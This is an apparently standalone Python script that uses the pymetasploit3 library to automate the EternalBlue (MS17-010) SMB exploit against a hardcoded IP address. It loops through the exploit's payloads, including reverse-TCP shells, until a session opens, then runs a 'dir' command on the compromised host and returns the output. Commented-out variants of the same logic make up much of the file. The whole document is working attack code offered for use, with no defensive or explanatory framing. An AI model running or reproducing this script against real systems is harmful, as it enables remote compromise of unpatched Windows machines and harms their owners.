import subprocess
import smbclient
import re
from pymetasploit3.msfrpc import MsfRpcClient

def test(ipadress):
        client = MsfRpcClient('1qaz@WSX',ssl=False)
        print(client.sessions.list)
        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS']  = ipadress
        # exploit['CHOST'] = re.sub("\\n","",subprocess.check_output(["hostname -I | awk '{print $2}'"],shell=True).decode("utf-8"))
        # re.sub("\\n","",subprocess.check_output(["hostname -I | awk '{print $2}'"],shell=True).decode("utf-8"))
        #re.sub("\\n","",subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))
        # exploit['CPORT'] = "4444"

        reverse_tcp_list = exploit.targetpayloads()
        for i in reverse_tcp_list:
            result = exploit.execute(payload=str(i))
            if dict(result)['job_id'] != "None":
                print(dict(result)['job_id'])
                print(i)
                # print(client.sessions.list)
                if bool(client.sessions.list):
                    session_number = list(client.sessions.list.keys())[0]
                    print(session_number)
                    shell = client.sessions.session(session_number)
                    shell.write('dir')
                    result = shell.read()
                    final_result = "\n".join(result.splitlines()[4:10])
                    
                    print(final_result)
                    return final_result
            else:
                continue
        return "NULL"                
            # if "reverse_tcp" in str(i).endswith("reverse_tcp"):
            #     print(i)
            #     if exploit.execute(payload=str(i))['job_id'] != "none":
            #         if bool(client.sessions.list):
            #             session_number = list(client.sessions.list.keys())[0]
            #             print(session_number)
            #             shell = client.sessions.session(session_number)
            #             shell.write('dir')
            #             result = shell.read()
            #             final_result = "\n".join(result.splitlines()[4:10])
                        
            #             print(final_result)
            #             return final_result
            #         else:
            #             print("null")
            #             return "NULL"                    
        # result = exploit.execute(payload="windows/x64/shell/reverse_tcp")
        # print(result)
        # # print(result)
        #             if bool(client.sessions.list):
        #                 session_number = list(client.sessions.list.keys())[0]
        #                 print(session_number)
        #                 shell = client.sessions.session(session_number)
        #                 shell.write('dir')
        #                 result = shell.read()
        #                 final_result = "\n".join(result.splitlines()[4:10])
                        
        #                 print(final_result)
        #                 return final_result
        #             else:
        #                 print("null")
        #                 return "NULL"
test("10.10.232.18")